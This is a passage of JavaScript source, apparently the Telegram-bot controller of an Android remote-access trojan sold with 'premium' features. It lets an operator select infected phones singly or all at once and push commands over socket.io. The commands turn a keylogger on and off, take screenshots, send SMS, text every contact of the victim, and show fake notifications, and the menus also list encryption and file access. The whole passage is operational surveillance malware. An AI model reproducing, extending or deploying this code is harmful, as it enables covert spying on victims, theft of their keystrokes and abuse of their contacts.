      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯ (premium)
    if (msg.text === '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯
    if (msg.text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'keylogger-on', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'keylogger-on', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯
    if (msg.text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'keylogger-off', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'keylogger-off', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯ (premium)
    if (msg.text === '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯ (premium)
    if (msg.text === '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯ (premium)
    if (msg.text === '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯ (premium)
    if (msg.text === '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯
    if (msg.text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
      appData.set('currentAction', 'screenshot');
      bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚃𝚘𝚊𝚜𝚝 ✯
    if (msg.text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
      appData.set('currentAction', 'toastText');
      bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯
    if (msg.text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯') {
      appData.set('currentAction', 'smsNumber');
      bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯
    if (msg.text === '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯') {
      appData.set('currentAction', 'vibrateDuration');
      bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯
    if (msg.text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
      appData.set('currentAction', 'textToAllContacts');
      bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯ (premium)
    if (msg.text === '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯ (premium)
    if (msg.text === '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯') {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚍𝚖 𝚝𝚘 𝚋𝚞𝚢 @𝚜𝚙𝚑𝚊𝚗𝚝𝚎𝚛</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯
    if (msg.text === '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯') {
      appData.set('currentAction', 'notificationText');
      bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }

// ============================================================================
// SELECCIÓN DE DISPOSITIVO OBJETIVO Y COMANDOS GLOBALES
// ============================================================================
  else {
    io.sockets.sockets.forEach((connectedSocket, socketId, socketMap) => {
      if (msg.text === connectedSocket.model) {
        appData.set('currentTarget', socketId);
        bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ' + connectedSocket.model + '</b>\n\n', {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
              ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
              ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
              ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
              ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
              ['✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
              ['✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯'],
              ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
              ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
              ['✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯'],
              ['✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
              ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
              ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
    });

    if (msg.text == '✯ 𝙰𝚕𝚕 ✯') {
      appData.set('currentTarget', 'all');
      bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
            ['✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
            ['✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯'],
            ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
            ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
            ['✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯'],
            ['✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }
});

// ============================================================================
// BLOQUE 4 (Líneas 351-384): INTERVALOS DE MANTENIMIENTO Y ARRANQUE
// ============================================================================

// Ping a todos los sockets conectados cada 5 segundos (5000 ms)
setInterval(() => {
  io.sockets.sockets.forEach((socket, socketId, socketMap) => {
    io.to(socketId).emit('ping', {});
  });
}, 5000);

// Keep-Alive HTTPS cada 8 minutos (480000 ms = 8 * 60 * 1000)
// Realiza una petición GET a data.url para mantener la conexión activa
setInterval(() => {
  https.get(data.url, (res) => {}).on('error', (err) => {});
}, 480000);

// Inicia el servidor HTTP en el puerto definido en process.env.PORT o 3000 por defecto
server.listen(process.env.PORT || 3000, () => {
  console.log('listening on port 3000');
});
